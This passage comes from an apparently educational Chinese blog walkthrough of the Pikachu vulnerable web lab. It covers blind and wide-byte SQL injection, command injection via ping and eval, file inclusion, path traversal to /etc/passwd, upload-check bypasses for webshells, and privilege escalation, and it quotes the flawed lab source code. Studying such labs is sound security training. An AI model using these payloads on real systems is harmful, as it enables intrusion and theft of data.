punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+//判断数据库字符数</span>lucy<span class="token string">' and sleep(if(substr(database(),1,1)='</span>p<span class="token string">',5,0))--+//判断数据库名lucy'</span> <span class="token operator">and</span> <span class="token keyword">if</span><span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'h'</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">--+//判断表名</span>lucy<span class="token string">' and if(substr((select column_name from information_schema.columns where table_schema=database() and table_name='</span>users<span class="token string">' limit 0,1),1,1)='</span>i<span class="token string">',sleep(5),0)--+//判断字段名lucy'</span> <span class="token operator">and</span> <span class="token keyword">if</span><span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> username <span class="token keyword">from</span> users <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//判断用户名</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>*<strong>注</strong>：因为盲注耗时较大，强烈建议使用脚本或者工具去测试</p><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>宽字节注入，简单来说就是数据库用了GBK编码，\转义了’ ,\的GBK编码是%5c,而%df%5c是一个繁体字“連”，可以输入%df吃掉%5c,此时单引号逃逸就可以发挥作用了</p><p>sqlmap中可以利用<code>unmagicquotes.py</code>tamper来自动化进行宽字节注入</p><p><strong>源码</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">escape</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$query</span><span class="token operator">=</span><span class="token string double-quoted-string">"select id,email from member where username='<span class="token interpolation"><span class="token variable">$name</span></span>'"</span><span class="token punctuation">;</span><span class="token comment">//这里的变量是字符型，需要考虑闭合</span><span class="token comment">//设置mysql客户端来源编码是gbk,这个设置导致出现宽字节注入问题</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="概述-4"><a href="#概述-4" class="headerlink" title="概述"></a>概述</h3><p>RCE(remote command/code execute)，RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统</p><h4 id="远程系统命令执行"><a href="#远程系统命令执行" class="headerlink" title="远程系统命令执行"></a><strong>远程系统命令执行</strong></h4><p>一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口<br>比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上<br>一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器</p><h4 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a><strong>远程代码执行</strong></h4><p>同样的道理,因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。不管是使用了代码执行的函数,还是使用了不安全的反序列化等等</p><p>因此，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法</p><h3 id="exec-“ping”"><a href="#exec-“ping”" class="headerlink" title="exec “ping”"></a>exec “ping”</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">localhost <span class="token operator">&amp;&amp;</span> <span class="token function">whoami</span>a <span class="token operator">&amp;</span> <span class="token function">whoami</span>a <span class="token operator">|</span> <span class="token function">whoami</span>a <span class="token operator">||</span> <span class="token function">whoami</span>a<span class="token punctuation">;</span><span class="token function">whoami</span>//类linux特有<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>源码</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$ip</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ipaddress'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//     $check=explode('.', $ip);可以先拆分，然后校验数字以范围，第一位和第四位1-255，中间两位0-255</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token function">php_uname</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'s'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'windows'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//         var_dump(php_uname('s'));</span>        <span class="token variable">$result</span><span class="token operator">.=</span><span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ping '</span><span class="token operator">.</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//直接将变量拼接进来，没做处理</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$result</span><span class="token operator">.=</span><span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ping -c 4 '</span><span class="token operator">.</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在执行命令处，直接是做命令拼接，没有做任何的过滤</p><h3 id="exec-“eval”"><a href="#exec-“eval”" class="headerlink" title="exec “eval”"></a>exec “eval”</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>源码</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'txt'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>@<span class="token operator">!</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'txt'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><code>eval</code>函数直接就处理了用户输入的数据</p><h2 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h2><h3 id="概述-5"><a href="#概述-5" class="headerlink" title="概述"></a>概述</h3><p>文件包含，是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。比如 在PHP中，提供了：</p><ul><li><p>include()</p></li><li><p>include_once()</p></li><li><p>require()</p></li><li><p>require_once()</p></li></ul><p>这些文件包含函数，这些函数在代码设计中被经常使用到。<br>大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。攻击着会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。根据不同的配置环境，文件包含漏洞分为如下两种情况：<br>  <strong>1.本地文件包含漏洞：</strong>仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。<br>  <strong>2.远程文件包含漏洞：</strong>能够通过url地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。                    </p><p>因此，在web应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的白名单策略进行过滤。                    </p><h3 id="File-Inclusion-local"><a href="#File-Inclusion-local" class="headerlink" title="File Inclusion(local)"></a>File Inclusion(local)</h3><pre class="line-numbers language-none"><code class="language-none">..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>源码</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">include</span> <span class="token string double-quoted-string">"include/<span class="token interpolation"><span class="token variable">$filename</span></span>"</span><span class="token punctuation">;</span><span class="token comment">//变量传进来直接包含,没做任何的安全限制</span><span class="token comment">//     //安全的写法,使用白名单，严格指定包含的文件名</span><span class="token comment">//     if($filename=='file1.php' || $filename=='file2.php' || $filename=='file3.php' || $filename=='file4.php' || $filename=='file5.php')&#123;</span><span class="token comment">//         include "include/$filename";</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>作者在注释中也说明的比较清楚了，没有做任何限制，可以直接查看一些敏感文件</p><h3 id="File-Inclusion-remote"><a href="#File-Inclusion-remote" class="headerlink" title="File Inclusion(remote)"></a>File Inclusion(remote)</h3><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;baidu.com&#x2F;robots.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/04/08/n9ys7ZzoFaq3hXk.png"></p><p><strong>源码</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//远程文件包含漏洞,需要php.ini的配置文件符合相关的配置</span><span class="token variable">$html</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">include</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$filename</span></span>"</span><span class="token punctuation">;</span><span class="token comment">//变量传进来直接包含,没做任何的安全限制</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>开启<code>allow_url_fopen</code>和<code>allow_url_include</code>配置，且关闭<code>magic_quotes_gpc</code>配置的情况下，可以直接包含远程文件</p><h2 id="Unsafe-Filedownload"><a href="#Unsafe-Filedownload" class="headerlink" title="Unsafe Filedownload"></a>Unsafe Filedownload</h2><h3 id="概述-6"><a href="#概述-6" class="headerlink" title="概述"></a>概述</h3><p>文件下载功能在很多web系统上都会出现，一般我们当点击下载链接，便会向后台发送一个下载请求，一般这个请求会包含一个需要下载的文件名称，后台在收到请求后会开始执行下载代码，将该文件名对应的文件response给浏览器，从而完成下载。如果后台在收到请求的文件名后,将其直接拼进下载文件的路径中而不对其进行安全判断的话，则可能会引发不安全的文件下载漏洞。此时如果 攻击者提交的不是一个程序预期的的文件名，而是一个精心构造的路径(比如../../../etc/passwd),则很有可能会直接将该指定的文件下载下来。从而导致后台敏感信息(密码文件、源代码等)被下载。</p><p>所以，在设计文件下载功能时，如果下载的目标文件是由前端传进来的，则一定要对传进来的文件进行安全考虑。切记：所有与前端交互的数据都是不安全的，不能掉以轻心！</p><h3 id="Unsafe-Filedownload-1"><a href="#Unsafe-Filedownload-1" class="headerlink" title="Unsafe Filedownload"></a>Unsafe Filedownload</h3><p>抓包下载 passwd</p><pre class="line-numbers language-none"><code class="language-none">..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改参数，下载敏感文件</p><p><img src="https://s2.loli.net/2022/04/08/qnK96T7kdwbAza1.png"></p><p><strong>源码</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">// $file_name="cookie.jpg";</span><span class="token variable">$file_path</span><span class="token operator">=</span><span class="token string double-quoted-string">"download/<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">;</span><span class="token operator">...</span><span class="token variable">$fp</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$file_path</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file_size</span><span class="token operator">=</span><span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">...</span><span class="token comment">//循环读取文件流,然后返回到浏览器feof确认是否到EOF</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$file_count</span><span class="token operator">&lt;</span><span class="token variable">$file_size</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$file_con</span><span class="token operator">=</span><span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span><span class="token variable">$buffer</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file_count</span><span class="token operator">+=</span><span class="token variable">$buffer</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$file_con</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在读取文件路劲时并没有做任何的限制，这就导致可以利用<code>../</code>返回上级目录，从而去下载敏感文件</p><h2 id="Unsafe-Fileupload"><a href="#Unsafe-Fileupload" class="headerlink" title="Unsafe Fileupload"></a>Unsafe Fileupload</h2><h3 id="概述-7"><a href="#概述-7" class="headerlink" title="概述"></a>概述</h3><p>文件上传功能在web应用系统很常见，比如很多网站注册的时候需要上传头像、上传附件等等。当用户点击上传按钮后，后台会对上传的文件进行判断<br>比如是否是指定的类型、后缀名、大小等等，然后将其按照设计的格式进行重命名后存储在指定的目录。</p><p>如果说后台对上传的文件没有进行任何的安全判断或者判断条件不够严谨，则攻击着可能会上传一些恶意的文件，比如一句话木马，从而导致后台服务器被webshell。                    </p><p>所以，在设计文件上传功能时，一定要对传进来的文件进行严格的安全考虑。比如：</p><ul><li>验证文件类型、后缀名、大小;</li><li>验证文件的上传方式;</li><li>对文件进行一定复杂的重命名;</li><li>不要暴露文件上传后的路径;</li><li>等等…</li></ul><h3 id="client-check"><a href="#client-check" class="headerlink" title="client check"></a>client check</h3><p>删除前端检测函数再上传 <code>checkFileExt(this.value)</code></p><p><img src="https://s2.loli.net/2022/04/08/NaLW3fKTlb9vJcy.png"></p><p>成功上传并执行命令</p><p><img src="https://s2.loli.net/2022/04/08/7PNLeulFn48whZI.png"></p><p><strong>前端jsp源码</strong></p><pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;script&gt;    function checkFileExt(filename)    &#123;        var flag &#x3D; false; &#x2F;&#x2F;状态        var arr &#x3D; [&quot;jpg&quot;,&quot;png&quot;,&quot;gif&quot;];        &#x2F;&#x2F;取出上传文件的扩展名        var index &#x3D; filename.lastIndexOf(&quot;.&quot;);        var ext &#x3D; filename.substr(index+1);        &#x2F;&#x2F;比较        for(var i&#x3D;0;i&lt;arr.length;i++)        &#123;            if(ext &#x3D;&#x3D; arr[i])            &#123;                flag &#x3D; true; &#x2F;&#x2F;一旦找到合适的，立即退出循环                break;            &#125;        &#125;        &#x2F;&#x2F;条件判断        if(!flag)        &#123;            alert(&quot;上传的文件不符合要求，请重新选择！&quot;);            location.reload(true);        &#125;    &#125;&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="MIME-type"><a href="#MIME-type" class="headerlink" title="MIME type"></a>MIME type</h3><p>修改 Content-Type</p><pre class="line-numbers language-none"><code class="language-none">Content-Type: image&#x2F;png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/04/08/WlgckJMsN4tyVwK.png"></p><p>成功上传</p><p><strong>源码</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$mime</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'image/jpg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'image/jpeg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'image/png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//指定MIME类型,这里只是对MIME类型做了判断。</span><span class="token variable">$save_path</span><span class="token operator">=</span><span class="token string single-quoted-string">'uploads'</span><span class="token punctuation">;</span><span class="token comment">//指定在当前目录建立一个目录</span><span class="token variable">$upload</span><span class="token operator">=</span><span class="token function">upload_sick</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'uploadfile'</span><span class="token punctuation">,</span><span class="token variable">$mime</span><span class="token punctuation">,</span><span class="token variable">$save_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//调用函数</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$upload</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'return'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$html</span><span class="token operator">.=</span><span class="token string double-quoted-string">"&lt;p class='notice'>文件上传成功&lt;/p>&lt;p class='notice'>文件保存的路径为：<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$upload</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'new_path'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>&lt;/p>"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize"></a>getimagesize</h3><p>上传图片马</p><p><img src="https://s2.loli.net/2022/04/08/O2ocam4MpPyBqgX.png"></p><p>利用文件包含解析图片马</p><p><img src="https://s2.loli.net/2022/04/08/QkjSZ9FNhXrcaEL.png"></p><p><strong>源码</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$type</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'jpeg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//指定类型</span><span class="token variable">$mime</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'image/jpg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'image/jpeg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'image/png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$save_path</span><span class="token operator">=</span><span class="token string single-quoted-string">'uploads'</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/Y/m/d/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//根据当天日期生成一个文件夹</span><span class="token variable">$upload</span><span class="token operator">=</span><span class="token function">upload</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'uploadfile'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'512000'</span><span class="token punctuation">,</span><span class="token variable">$type</span><span class="token punctuation">,</span><span class="token variable">$mime</span><span class="token punctuation">,</span><span class="token variable">$save_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//调用函数</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$upload</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'return'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$html</span><span class="token operator">.=</span><span class="token string double-quoted-string">"&lt;p class='notice'>文件上传成功&lt;/p>&lt;p class='notice'>文件保存的路径为：<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$upload</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'save_path'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>&lt;/p>"</span><span class="token punctuation">;</span><span class="token operator">...</span><span class="token keyword">function</span> <span class="token function-definition function">upload</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token variable">$size</span><span class="token punctuation">,</span><span class="token variable">$type</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$mime</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$save_path</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token variable">$arr_errors</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span>      <span class="token number">1</span><span class="token operator">=></span><span class="token string single-quoted-string">'上传的文件超过了 php.ini中 upload_max_filesize 选项限制的值'</span><span class="token punctuation">,</span>      <span class="token number">2</span><span class="token operator">=></span><span class="token string single-quoted-string">'上传文件的大小超过了 HTML 表单中 MAX_FILE_SIZE 选项指定的值'</span><span class="token punctuation">,</span>      <span class="token number">3</span><span class="token operator">=></span><span class="token string single-quoted-string">'文件只有部分被上传'</span><span class="token punctuation">,</span>      <span class="token number">4</span><span class="token operator">=></span><span class="token string single-quoted-string">'没有文件被上传'</span><span class="token punctuation">,</span>      <span class="token number">6</span><span class="token operator">=></span><span class="token string single-quoted-string">'找不到临时文件夹'</span><span class="token punctuation">,</span>      <span class="token number">7</span><span class="token operator">=></span><span class="token string single-quoted-string">'文件写入失败'</span>  <span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Over-Permission"><a href="#Over-Permission" class="headerlink" title="Over Permission"></a>Over Permission</h2><h3 id="概述-8"><a href="#概述-8" class="headerlink" title="概述"></a>概述</h3><p>如果使用A用户的权限去操作B用户的数据，A的权限小于B的权限，如果能够成功操作，则称之为越权操作。越权漏洞形成的原因是后台使用了 不合理的权限校验规则导致的。 </p><p>一般越权漏洞容易出现在权限页面（需要登录的页面）增、删、改、查的的地方，当用户对权限页面内的信息进行这些操作时，后台需要对当前用户的权限进行校验，看其是否具备操作的权限，从而给出响应，而如果校验的规则过于简单则容易出现越权漏洞。</p><p>因此，在在权限管理中应该遵守：</p><ul><li>使用最小权限原则对用户进行赋权;</li><li>使用合理（严格）的权限校验规则;</li><li>使用后台登录态作为条件进行权限判断,别动不动就瞎用前端传进来的条件;</li></ul><h3 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h3><p>修改 <code>username</code> 查看不同用户的信息</p><p><img src="https://s2.loli.net/2022/04/09/uISHbJLaheAcFMl.png"></p><p><img src="https://s2.loli.net/2022/04/09/IAoCxY4B9wrqNjm.png"></p><p><strong>源码</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//查询数据时没有使用session来校验,而是使用的传进来的值，权限校验出现问题,这里应该跟登录态关系进行绑定</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token function">escape</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$query</span><span class="token operator">=</span><span class="token string double-quoted-string">"select * from member where username='<span class="token interpolation"><span class="token variable">$username</span></span>'"</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mysqli_num_rows</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$data</span><span class="token operator">=</span><span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$uname</span><span class="token operator">=</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$sex</span><span class="token operator">=</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sex'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$phonenum</span><span class="token operator">=</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'phonenum'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$add</span><span class="token operator">=</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'address'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$email</span><span class="token operator">=</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h3><p>pikachu 用户访问用户添加界面 op2_admin_edit.php 直接添加用户</p><p>pikachu/000000</p><p><img src="https://s2.loli.net/2022/04/09/yiJuBSDFTCHjUpm.png"></p><p><img src="https://s2.loli.net/2022/04/09/1J9U5leHVoytAbN.png"></p><p>直接添加新用户</p><p><img src="https://s2.loli.net/2022/04/09/EJUjNqbWYLXyIvK.png"></p><p><strong>源码</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">// 判断是否登录，没有登录不能访问</span><span class="token comment">//这里只是验证了登录状态，并没有验证级别，所以存在越权问题。</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">check_op2_login</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string 